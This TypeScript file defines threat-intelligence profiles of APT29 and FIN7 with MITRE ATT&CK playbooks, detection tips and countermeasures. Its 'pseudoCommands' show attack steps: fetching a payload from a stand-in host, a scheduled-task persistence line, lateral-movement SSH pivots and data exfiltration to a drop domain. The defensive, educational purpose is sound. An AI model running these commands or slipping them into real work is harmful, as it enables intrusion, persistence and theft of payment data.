export interface AdversaryProfile {
  id: string;
  alias: string[];
  description: string;
  motivation: string;
  region: string;
  operationsSince: number;
  targetSectors: string[];
  preferredTactics: string[];
  exploitCves: string[];
  recentCampaigns: string[];
  playbook: PlaybookStep[];
  detectionOpportunities: string[];
  countermeasures: string[];
  references: string[];
  lastUpdated: string;
}

export interface PlaybookStep {
  phase: string;
  tactic: string;
  mitreTechnique: string;
  mitreId: string;
  description: string;
  pseudoCommands: string[];
  detectionTips: string[];
}

const adversaryProfiles: Record<string, AdversaryProfile> = {
  apt29: {
    id: "apt29",
    alias: ["Cozy Bear", "The Dukes"],
    description:
      "APT29 is a Russia-nexus espionage group known for stealthy intrusions against government, diplomatic, healthcare, and energy organizations.",
    motivation: "Espionage",
    region: "Russia",
    operationsSince: 2008,
    targetSectors: ["government", "energy", "healthcare", "think_tanks"],
    preferredTactics: ["TA0001", "TA0003", "TA0005", "TA0006", "TA0007"],
    exploitCves: ["CVE-2023-42793", "CVE-2023-23397", "CVE-2022-30190"],
    recentCampaigns: [
      "2023 diplomatic credential theft via Microsoft Outlook zero-day",
      "2024 supply-chain compromise of managed service providers",
    ],
    playbook: [
      {
        phase: "Initial Access",
        tactic: "TA0001",
        mitreTechnique: "Spearphishing Attachment",
        mitreId: "T1566.001",
        description:
          "Delivers lure documents weaponized with Outlook or Office zero-day exploits to diplomatic staff.",
        pseudoCommands: [
          "send_phish --template=foreign_affairs.docm --targets=diplomats.csv",
          "trigger-exploit CVE-2023-23397 --payload=[SIMULATED_STAGER]",
        ],
        detectionTips: [
          "Correlate Outlook reminder property abuse with sender reputation",
          "Flag Microsoft Office child processes spawning PowerShell",
        ],
      },
      {
        phase: "Execution",
        tactic: "TA0002",
        mitreTechnique: "PowerShell",
        mitreId: "T1059.001",
        description:
          "Executes obfuscated PowerShell that drops encrypted payloads and establishes C2 over HTTPS.",
        pseudoCommands: [
          "powershell -EncodedCommand [SIMULATED_PAYLOAD]",
          "invoke-webrequest https://cdn-cozy.example/update.bin -OutFile C:\\ProgramData\\mscore.ps1",
        ],
        detectionTips: [
          "Baseline PowerShell ScriptBlock logging for abnormal encoded commands",
          "Alert on PowerShell contacting rare external domains over 443",
        ],
      },
      {
        phase: "Persistence",
        tactic: "TA0003",
        mitreTechnique: "Scheduled Task/Job",
        mitreId: "T1053.005",
        description: "Creates hidden scheduled task to launch DLL via rundll32 at user logon.",
        pseudoCommands: [
          "schtasks /Create /SC ONLOGON /TN WindowsUpdateSvc /TR \"rundll32.exe C:\\ProgramData\\updates.dll,Init\"",
        ],
        detectionTips: [
          "Monitor schtasks events creating hidden or misspelled tasks",
          "Cross-reference rundll32 invocations with unsigned DLL loads",
        ],
      },
      {
        phase: "Command & Control",
        tactic: "TA0011",
        mitreTechnique: "Web Protocols",
        mitreId: "T1071.001",
        description: "Establishes multi-stage HTTPS C2 using cloud CDN infrastructure.",
        pseudoCommands: [
          "beacon --profile=low-slow --domain=cdn-cozy.example --jitter=35",
        ],
        detectionTips: [
          "Detect long-lived HTTPS sessions with low data volume",
          "Inspect JA3 fingerprints associated with known APT29 tooling",
        ],
      },
    ],
    detectionOpportunities: [
      "Scripting engine telemetry (PowerShell, WMI) for encoded commands",
      "Registry changes to Outlook Reminder configuration",
      "Unusual scheduled tasks created by non-administrative users",
    ],
    countermeasures: [
      "Deploy mailbox auditing rules for sensitive diplomatic accounts",
      "Enable AMSI with script content forwarding to the SIEM",
      "Implement TLS inspection with JA3 fingerprint alerting",
    ],
    references: [
      "https://attack.mitre.org/groups/G0016/",
      "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-163a",
    ],
    lastUpdated: "2024-11-15",
  },
  fin7: {
    id: "fin7",
    alias: ["Carbanak", "Navigator Group"],
    description:
      "FIN7 is a financially motivated threat group with advanced intrusion tradecraft targeting retail, hospitality, and financial services.",
    motivation: "Financial gain",
    region: "Eastern Europe",
    operationsSince: 2013,
    targetSectors: ["retail", "hospitality", "financial_services", "manufacturing"],
    preferredTactics: ["TA0001", "TA0006", "TA0007", "TA0008", "TA0040"],
    exploitCves: ["CVE-2024-21410", "CVE-2023-48795"],
    recentCampaigns: [
      "2024 supply-chain compromise targeting point-of-sale vendors",
      "2024 SSH CVE-2023-48795 exploitation for lateral movement",
    ],
    playbook: [
      {
        phase: "Initial Access",
        tactic: "TA0001",
        mitreTechnique: "Trusted Relationship",
        mitreId: "T1199",
        description:
          "Abuses managed service provider access to reach downstream retail environments.",
        pseudoCommands: [
          "ssh msp-admin@partner.example",
          "scp payload.dll msp-admin@pos-vendor:/tmp/",
        ],
        detectionTips: [
          "Monitor partner VPN accounts for after-hours logins",
          "Alert on sudden configuration pushes to multiple POS endpoints",
        ],
      },
      {
        phase: "Lateral Movement",
        tactic: "TA0008",
        mitreTechnique: "Remote Services: SSH",
        mitreId: "T1021.004",
        description: "Uses SSH multiplexing with Carbanak implants to pivot across POS networks.",
        pseudoCommands: [
          "ssh -J jumphost pos-admin@pos-register-12",
          "sshuttle -r pos-admin@pos-register-12 10.20.0.0/16",
        ],
        detectionTips: [
          "Detect SSH port forwarding to nonstandard destinations",
          "Correlate SSH logins with new internal subnet access",
        ],
      },
      {
        phase: "Collection",
        tactic: "TA0009",
        mitreTechnique: "Input Capture",
        mitreId: "T1056",
        description: "Deploys DLLs that scrape memory for payment card data.",
        pseudoCommands: [
          "deploy-memory-scraper --target=pos --mode=stealth",
        ],
        detectionTips: [
          "Alert on unsigned DLL injection into POS processes",
          "Monitor for anomalous memory read operations on payment applications",
        ],
      },
      {
        phase: "Impact",
        tactic: "TA0040",
        mitreTechnique: "Exfiltration Over C2 Channel",
        mitreId: "T1041",
        description: "Exfiltrates card dumps via encrypted channels to bulletproof hosting.",
        pseudoCommands: [
          "exfiltrate --proto=https --dest=fin7-drop.example --chunk-size=64k",
        ],
        detectionTips: [
          "Identify large HTTPS POST requests to rare autonomous systems",
          "Hunt for TLS certificates reused across known FIN7 C2 nodes",
        ],
      },
    ],
    detectionOpportunities: [
      "Partner access analytics with geo-velocity checks",
      "Point-of-sale process integrity monitoring",
      "Outbound TLS traffic baselining including SNI anomalies",
    ],
    countermeasures: [
      "Implement privileged access management for MSP accounts",
      "Deploy allow-listing on POS endpoints",
      "Enable data loss prevention policies for payment data patterns",
    ],
    references: [
      "https://attack.mitre.org/groups/G0046/",
      "https://www.cisa.gov/news-events/alerts/2024/02/15/fin7-tactics-techniques-procedures",
    ],
    lastUpdated: "2024-11-08",
  },
};

export function listAdversaryProfiles(): AdversaryProfile[] {
  return Object.values(adversaryProfiles);
}

export function getAdversaryProfile(key: string): AdversaryProfile | undefined {
  return adversaryProfiles[key.toLowerCase()];
}
